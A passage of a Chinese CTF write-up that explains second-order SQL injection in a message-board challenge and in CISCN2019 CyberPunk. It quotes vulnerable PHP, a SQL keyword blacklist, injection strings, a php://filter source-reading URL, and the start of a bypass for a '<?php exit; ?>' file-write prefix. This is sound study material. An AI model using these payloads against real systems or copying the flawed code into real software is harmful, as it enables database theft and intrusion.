class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                title = &#x27;<span class=\"subst\">$title</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">&#x27;comment&#x27;</span>:</span><br><span class=\"line\">    <span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">            set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">                bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./comment.php?id=<span class=\"subst\">$bo_id</span>&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location: ./index.php&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>注意如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;category&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$title</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;title&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into board set category = &#x27;<span class=\"subst\">$category</span>&#x27;, title = &#x27;<span class=\"subst\">$title</span>&#x27;,content = &#x27;<span class=\"subst\">$content</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"comment\">//在插入的时候所有接收的参数都用了addslashes过滤，不存在漏洞</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"variable\">$bo_id</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;bo_id&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select category from board where id=&#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"title function_ invoke__\">mysql_num_rows</span>(<span class=\"variable\">$result</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$num</span>&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$category</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"variable\">$result</span>)[<span class=\"string\">&#x27;category&#x27;</span>];    <span class=\"comment\"># 注意这行，在从数据库中取出数据时没有过滤，存在二次注入</span></span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;content&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into comment</span></span><br><span class=\"line\"><span class=\"string\">        set category = &#x27;<span class=\"subst\">$category</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            content = &#x27;<span class=\"subst\">$content</span>&#x27;,</span></span><br><span class=\"line\"><span class=\"string\">            bo_id = &#x27;<span class=\"subst\">$bo_id</span>&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>通过上面代码分析，我们可以发现是存在二次注入，注入点在 category 中</p>\n<p>这边有点需要注意：虽然 addslashes 会转义’，但在插入数据库时转义字符 \\ 并不会插入数据库</p>\n<p>接下来构造注入语句：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023180732878.png\" alt=\"image-20221023180732878\"></p>\n<blockquote>\n<p>这个 title 可以乱写，注入点在 category 中，首先先闭合原来的 category，然后去覆盖 content，因为如果直接注释，插入数据库会报列数不匹配的错误</p>\n<p>在覆盖的同时，我们的注入语句也在自己写的 content 中</p>\n<p>最后他给的 content 随便乱写，因为被我们写的注入语句的 content 覆盖了</p>\n<p>最后的语句为：</p>\n<p>insert into board set category = ‘a\\’,content=database(),/*, title = ‘aa’,content = ‘aaaa’;</p>\n<p>此时’仍被转义，但插入数据库后转义符号消失，这就是为什么在下一个页面我们的 aaaa 正文能显示</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181703773.png\" alt=\"image-20221023181703773\"></p>\n<p>接下来到 comment 页面，会根据刚刚的 title 查询出我们当时写的，即从数据库中取出 category，然后加上我们的提交的留言再次入库</p>\n<blockquote>\n<p>category 取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了</p>\n<p>然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉</p>\n<p>最后语句变为了</p>\n<p>sql =` \"insert into comment set category = 'a',content=database(),/*', content = '*/#', bo_id = 'bo_id’&quot;;`</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png\" alt=\"image-20221023181848314\"></p>\n<p>得到库名，下面的 getflag 操作不在赘述</p>\n<h6 id=\"2ciscn2019-华北赛区-day1-web5cyberpunk\"><a class=\"markdownIt-Anchor\" href=\"#2ciscn2019-华北赛区-day1-web5cyberpunk\">#</a> 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk</h6>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，</p>\n<p>在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//confirm.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//var_dump($_POST);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"variable\">$user_name</span>.<span class=\"string\">&quot;已提交订单&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;sss&quot;</span>, <span class=\"variable\">$user_name</span>, <span class=\"variable\">$address</span>, <span class=\"variable\">$phone</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$re</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单提交成功&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，</p>\n<p>但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//change.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$fetch</span>) &amp;&amp; <span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$fetch</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class=\"variable\">$address</span>.<span class=\"string\">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;address&#x27;</span>].<span class=\"string\">&quot;&#x27; where `user_id`=&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;user_id&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单修改成功&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;未找到订单!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;信息不全&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因此我们在 confirm.php 插入数据库中时，提交注入语句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png\" alt=\"image-20221023190851989\"></p>\n<p>在修改地址时二次引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png\" alt=\"image-20221023190938216\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png\" alt=\"image-20221023190949077\"></p>\n<p>因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<p>然后接下来带来一些花活：</p>\n<h6 id=\"php-exit-绕过\"><a class=\"markdownIt-Anchor\" href=\"#php-exit-绕过\">#</a>  <code>&lt;?php exit; ?&gt;</code>  绕过</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class=\"line\">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class=\"line\">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure>\n<p>$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>是可以控制协议的，我们即可使用</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>协议</mtext><mo separator=\"true\">,</mo><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>流的</mtext><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mo>−</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mtext>方法，将</mtext></mrow><annotation encoding=\"application/x-tex\">_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">制</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span></span></span></span> content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。</p>\n<p>因此我们可以找到两种 base64-decode 相关的绕过</p>\n<p>0x00 通过 base64 编码特性绕过</p>\n<p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 